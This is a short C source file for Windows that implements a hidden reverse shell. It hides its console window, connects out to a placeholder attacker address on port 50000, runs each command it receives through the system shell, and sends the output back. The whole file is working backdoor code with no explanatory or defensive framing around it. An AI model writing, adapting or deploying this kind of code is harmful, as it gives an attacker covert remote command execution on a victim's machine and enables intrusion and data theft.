#define _WIN32_WINNT 0x0600
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <winsock2.h>
#include <windows.h>

#pragma comment(lib, "ws2_32.lib")

#define PORT   50000
#define CLIENT "<IP_CLIENT>"

int main(void)
{
    HWND window = GetConsoleWindow();
    if (window) ShowWindow(window, SW_HIDE);

    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        return EXIT_FAILURE;
    }

    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        WSACleanup();
        return EXIT_FAILURE;
    }

    SOCKADDR_IN sin = {0};
    sin.sin_family      = AF_INET;
    sin.sin_port        = htons(PORT);
    sin.sin_addr.s_addr = inet_addr(CLIENT);

    if (connect(sock, (SOCKADDR*)&sin, sizeof(sin)) == SOCKET_ERROR) {
        closesocket(sock);
        WSACleanup();
        return EXIT_FAILURE;
    }

    char cmd[999];
    int n;
    while ((n = recv(sock, cmd, sizeof(cmd) - 1, 0)) > 0) {
        cmd[n] = '\0';

        FILE* fp = _popen(cmd, "r");
        if (!fp) {
            const char* err = "ERROR\n";
            send(sock, err, (int)strlen(err), 0);
            continue;
        }

        char out[9999] = "";
        char line[999];
        size_t used = 0;
        while (fgets(line, sizeof(line), fp) != NULL) {
            size_t len = strlen(line);
            if (used + len >= sizeof(out) - 1) break;
            memcpy(out + used, line, len);
            used += len;
        }
        out[used] = '\0';
        _pclose(fp);

        // Envoi avec taille explicite (protocole simple)
        uint32_t sz = htonl((uint32_t)used);
        send(sock, (const char*)&sz, sizeof(sz), 0);
        send(sock, out, (int)used, 0);
    }



    closesocket(sock);
    WSACleanup();
    return EXIT_SUCCESS;
}
